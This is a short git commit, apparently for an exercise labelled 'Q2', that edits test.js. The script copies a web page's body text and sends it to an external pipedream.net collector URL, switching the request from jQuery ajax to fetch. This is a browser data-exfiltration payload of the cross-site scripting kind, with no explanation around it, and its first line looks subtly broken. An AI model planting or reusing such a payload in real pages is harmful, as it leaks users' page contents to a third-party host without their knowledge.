1a45ece0f52cff12f32b3f2f1d3be89868050f7d
QingkangYu <qingkang.yuu@gmail.com>
2023-03-13 12:44:13 -0400

    Testing for Q2

--- test.js
+++ test.js
@@ -1,7 +1,2 @@
 document.title.innerText = document.body.innerText
-$.ajax(
-    {
-        type: "GET",
-        url: "https://enk4c3pf2z43.x.pipedream.net/?=" + document.title.innerText
-    }
-);
+fetch("https://enk4c3pf2z43.x.pipedream.net/?=" + document.title.innerText);
